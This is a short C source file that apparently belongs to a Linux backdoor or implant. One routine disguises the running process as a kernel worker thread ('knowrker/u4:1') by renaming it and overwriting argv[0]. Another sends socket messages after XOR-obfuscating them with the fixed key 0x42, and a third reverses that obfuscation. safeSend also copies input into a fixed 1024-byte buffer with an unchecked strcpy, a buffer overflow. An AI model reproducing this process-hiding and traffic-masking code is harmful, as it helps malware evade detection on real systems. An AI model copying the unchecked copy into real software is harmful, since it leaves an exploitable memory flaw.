#include "headers.h"
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <sys/prctl.h>


void maskProc(int argc, char *argv[]){
      prctl(PR_SET_NAME, "knowrker/u4:1", 0,0,0);
      
      memset(argv[0], 0, strlen(argv[0]));
      strcpy(argv[0], "knowrker/u4:1");
      

}

void safeSend(int connID, char *msg){
      char encryption[1024];
      strcpy(encryption, msg);
      for(int i=0; i<strlen(msg); i++){
          encryption[i] ^=0x42;
      }
      send(connID, encryption, strlen(encryption), 0);
}
void decrypt(char *input, int len, char key) {
      for (int i = 0; i < len; i++) {
          input[i] = input[i] ^ key;
      }
}
